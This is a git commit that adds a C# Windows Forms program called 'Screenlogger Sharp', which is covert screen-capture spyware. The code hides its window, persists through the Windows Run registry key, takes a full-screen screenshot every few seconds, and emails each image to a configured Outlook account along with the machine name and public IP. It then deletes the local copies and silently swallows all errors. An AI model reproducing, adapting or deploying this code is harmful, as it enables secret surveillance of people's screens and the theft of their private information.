0b8dc9ef020f26239435537798b3a07be6e583a4
diego-tella <diegotellaroli05@gmail.com>
2023-03-30 10:05:50 -0300

    First commit

---
+++ Screenlogger Sharp/Form1.Designer.cs
@@ -0,0 +1,62 @@
+﻿namespace Screenlogger_Sharp
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Variável de designer necessária.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Limpar os recursos que estão sendo usados.
+        /// </summary>
+        /// <param name="disposing">true se for necessário descartar os recursos gerenciados; caso contrário, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Código gerado pelo Windows Form Designer
+
+        /// <summary>
+        /// Método necessário para suporte ao Designer - não modifique 
+        /// o conteúdo deste método com o editor de código.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Location = new System.Drawing.Point(27, 24);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(97, 50);
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(120, 0);
+            this.Controls.Add(this.pictureBox1);
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+    }
+}
+
---
+++ Screenlogger Sharp/Form1.cs
@@ -0,0 +1,163 @@
+﻿using System;
+using System.Drawing;
+using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
+using System.Net;
+using System.Net.Mail;
+using System.Threading;
+using Microsoft.Win32;
+
+namespace Screenlogger_Sharp
+{
+    public partial class Form1 : Form
+    {
+        int i = 1, a = 1;
+        bool send = false;
+        private MailMessage email;
+        public Form1()
+        {
+            InitializeComponent();
+            this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+
+            if (pictureBox1.Image != null)
+                pictureBox1.Image.Dispose();
+        }
+        protected override CreateParams CreateParams
+        {
+            get
+            {
+                var cp = base.CreateParams;
+                cp.ExStyle |= 0x80;  // Turn on WS_EX_TOOLWINDOW
+                return cp;
+            }
+        }
+        private void Inicializar()
+        {
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            reg.SetValue("Meudaxcs", Application.ExecutablePath.ToString());
+
+        }
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            Inicializar();
+            try
+            {
+                string diretorio = @"C:\Windows\ILC\";
+                if (!Directory.Exists(diretorio))
+                {
+                    Directory.CreateDirectory(diretorio);
+                }
+                else
+                {
+
+                    DirectoryInfo di = new DirectoryInfo(diretorio);
+                    foreach (FileInfo file in di.GetFiles())
+                    {
+                        file.Delete();
+                    }
+                    Directory.Delete(diretorio);
+                    Thread.Sleep(1000);
+                    Directory.CreateDirectory(diretorio);
+                }
+                Manage();
+            }
+            catch (Exception) { }
+        }
+        private void Manage()
+        {
+            try
+            {
+                while (true)
+                {
+                    TakePic();
+                    SendPic();
+                    Thread.Sleep(2000);
+                    DeletePic();
+                    Thread.Sleep(4000);
+                }
+            }
+            catch (Exception) { }
+        }
+        private void TakePic()
+        {
+            try
+            {
+                Bitmap bw = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics g = Graphics.FromImage(bw);
+                g.CopyFromScreen(0, 0, 0, 0, bw.Size);
+                pictureBox1.Image = bw;
+                bw.Save(@"C:\Windows\ILC\" + i++ + ".jpeg");
+                bw.Dispose();
+            }
+            catch (Exception) { }
+        }
+        private void SendPic()
+        {
+            try
+            {
+                string hora = DateTime.Now.ToShortTimeString();
+                string data = DateTime.Now.ToShortDateString();
+                string ip = getIP();
+                
+                var NomePc = Environment.MachineName;
+                email = new MailMessage();
+                email.To.Add(new MailAddress("youremail@outlook.com"));
+                email.From = new MailAddress("youremail@outlook.com");
+                email.Subject = "New Pic";
+                email.IsBodyHtml = true;
+                email.Body = data + " <br> " + hora + "<br>IP: " + ip + "<br>Máquina: " + NomePc;
+
+                System.Net.Mail.Attachment aa;
+                aa = new System.Net.Mail.Attachment(@"C:\Windows\ILC\" + a++ + ".jpeg");
+                email.Attachments.Add(aa);
+
+                SmtpClient cliente = new SmtpClient();
+                cliente.Credentials = new System.Net.NetworkCredential("youremail@outlook.com", "yourpass");
+                cliente.Host = "smtp-mail.outlook.com"; //case using gmail
+                cliente.Port = 587;
+                cliente.EnableSsl = true;
+                cliente.Send(email);
+                aa.Dispose();
+                email.Dispose();
+                send = true;
+            }
+            catch (Exception ex)
+            {
+                //MessageBox.Show(ex.ToString()); //if there is an error in the SMTP you can uncomment this line 
+            }
+        }
+        int k = 0;
+        private void DeletePic()
+        {
+            if (send)
+            {
+                try
+                {
+                    k++;
+                    File.Delete(@"C:\Windows\ILC\" + k + ".jpeg");
+                    send = false;
+                }
+                catch (Exception) { }
+            }
+        }
+        private string getIP()
+        {
+            string ip;
+            try
+            {
+                using (WebClient web = new WebClient())
+                {
+                    ip = web.DownloadString("https://wtfismyip.com/text"); //get IP
+                }
+            }
+            catch (Exception)
+            {
+                ip = "Error";
+            }
+            return ip;
+        }
+    }
+}
+
